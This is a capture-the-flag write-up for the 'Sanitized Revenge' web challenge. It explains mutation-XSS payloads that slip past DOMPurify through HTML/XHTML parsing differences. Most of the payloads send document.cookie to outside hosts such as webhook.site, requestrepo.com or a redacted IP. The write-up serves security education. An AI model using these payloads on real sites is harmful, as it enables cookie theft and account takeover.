# Sanitized Revenge

* Category: Web
* Score: 499/500
* Solves: 3

## Description

You are not going to find a DOMPurify 0day right?

There is an unintended solution that made the previous one much easier than the intended solution. If you solved the previous one using the intended, this is a free flag for you.

## Solution

Same as the [previous one](../Sanitized/README.md), but the revenge version only allow you to submit a single `html` parameter to the bot instead of a whole url path. So it is necessary to put the url you want to send the flag to inside the html.

```html
<div><div id="url">https://webhook.site/65c71cbd-c78a-4467-8a5f-0a3add03e750?</div><style><![CDATA[</style><div data-x="]]></style><iframe name='Page' /><base href='/**/+location.assign(document.all.url.textContent+document.cookie)//' /><style><!--"></div><style>--></style></div>
```

## Other Solutions

### IcesFont @ idek

```html
<body>
<style>a { color: <!--}</style>
<img alt="--></style><base href='/(document.location=/http:/.source.concat(String.fromCharCode(47)).concat(String.fromCharCode(47)).concat(/cb6c5dql.requestrepo.com/.source).concat(String.fromCharCode(47)).concat(document.cookie));var[Page]=[1]//x/' />">
</body>
```

HTML comment inside script tag is ignored by HTML parser, but XHTML follows XML so `<!--` will be interpreted as comment, which ends at the `-->` in the `alt` attribute of the `img` tag. The `var[Page]=[1];` uses `var` [hoisting](https://developer.mozilla.org/en-US/docs/Glossary/Hoisting) to prevent the js from throwing error.

### Giotino @ TeamItaly

```html
a<style><ø:base id="giotino" xmlns:ø="http://www.w3.org/1999/xhtml" href="/**/=1;alert(document.cookie);//" /></style>
```

> This is not the same as the original payload, as it has been simplified and cleared up by me.

The reason for that non ASCII character is because DOMPurify have a [mXSS protection](https://github.com/cure53/DOMPurify/blob/main/src/purify.js#L1004-L1014), which attempts to find a HTML tag-like string using a regex `<[/\w]` when it encounters elemenet that is no supposed to have children. (e.g. `style`)

I know this sounds like a flaw in DOMPurify, but it actaully isn't. This is because HTML standard declares that [HTML tag name must be ASCII alphanumerics](https://html.spec.whatwg.org/multipage/syntax.html#syntax-tag-name), so the a standard-complaiant HTML parser [should only consume ASCII alphanumerics when parsing start tags](https://html.spec.whatwg.org/multipage/syntax.html#start-tags). This means there is no flaw in DOMPurify when used with HTML. On the other hand, XML allows [a lot of characters](https://www.w3.org/TR/xml/#NT-NameStartChar) to be a valid tag name, and so is XHTML.

### ??? @ FlagMotori

```html
ff<style><!--</style><a id="--><base href='/**/;var/**/Page;window.name=document.cookie;document.location.host=IPV4_ADDRESS_IN_INTEGER_FORM_REDACTED//'></base><!--"></a><style>&lt;k</style><style>--></style>
```

The explanation for this is left as an exercise to the reader. :)
